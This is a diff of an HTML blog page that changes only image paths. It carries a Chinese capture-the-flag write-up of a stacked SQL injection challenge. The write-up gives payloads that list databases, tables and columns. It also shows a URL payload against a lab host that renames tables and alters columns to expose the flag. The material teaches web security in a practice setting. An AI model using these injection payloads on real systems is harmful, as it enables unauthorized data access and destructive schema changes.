@@ -499,19 +499,19 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>打开环境，看到这样的页面<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/1.jpg" alt=""></p>
+                <p>打开环境，看到这样的页面<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/1.jpg" alt=""></p>
 <a id="more"></a>
-<p>加’引号测试<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.jpg" alt=""><br>报错<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/3.jpg" alt=""><br>加注释<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/4.jpg" alt=""><br>恢复正常，所以可以判断是单引号的注入</p>
-<p>之后开始判断列数<br>order by测试到3的时候报错<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/5.jpg" alt=""><br>所以一共有两列<br>判断完列数，开始union注入，但回显告诉我们过滤了很多关键字<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/6.jpg" alt=""><br>之后尝试了许多方法想要绕过，但都没有什么效果<br>然后就是学到的新东西了，堆叠注入<br>首先用show databases;爆库<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/7.jpg" alt=""><br>然后show tables;报表<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/8.jpg" alt=""><br>可以看到一共有两个表<br>words和1919810931114514<br>然后查询words表里所有的列</p>
+<p>加’引号测试<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/2.jpg" alt=""><br>报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/3.jpg" alt=""><br>加注释<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/4.jpg" alt=""><br>恢复正常，所以可以判断是单引号的注入</p>
+<p>之后开始判断列数<br>order by测试到3的时候报错<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/5.jpg" alt=""><br>所以一共有两列<br>判断完列数，开始union注入，但回显告诉我们过滤了很多关键字<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/6.jpg" alt=""><br>之后尝试了许多方法想要绕过，但都没有什么效果<br>然后就是学到的新东西了，堆叠注入<br>首先用show databases;爆库<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/7.jpg" alt=""><br>然后show tables;报表<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/8.jpg" alt=""><br>可以看到一共有两个表<br>words和1919810931114514<br>然后查询words表里所有的列</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span></code></pre>
-<p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/9.jpg" alt=""><br>words表里一共两列，id和data，结合我们用1查询出来的结果，也是一个序号一个字符串，所以基本确定我们当前所在的表就是words表<br>再查询1919810931114514表的列</p>
+<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/9.jpg" alt=""><br>words表里一共两列，id和data，结合我们用1查询出来的结果，也是一个序号一个字符串，所以基本确定我们当前所在的表就是words表<br>再查询1919810931114514表的列</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token punctuation">(</span>纯数字需要用反引号括起来<span class="token punctuation">)</span></code></pre>
-<p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/10.jpg" alt=""><br>可以看到这个表里面有我们需要的flag<br>那么该如何获取flag呢</p>
+<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/10.jpg" alt=""><br>可以看到这个表里面有我们需要的flag<br>那么该如何获取flag呢</p>
 <p>我们可以将words表改成另外一个名字，然后将1919810931114514表改为words，这样的话，我们只需要查询words表就能得到flag<br>payload如下</p>
 <pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;alter table words rename to word;alter table `1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10)--+</span></code></pre>
 <p>注：这里要注意几个问题：</p>
 <pre><code>对列名进行更改时，要在后面指定修改后的数据类型
-添加id列时，设置默认值，方便后面查询</code></pre><p>执行完payload后，然后再查询1’ and ‘1’=’1就可以得到flag<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/11.jpg" alt=""></p>
+添加id列时，设置默认值，方便后面查询</code></pre><p>执行完payload后，然后再查询1’ and ‘1’=’1就可以得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/11.jpg" alt=""></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
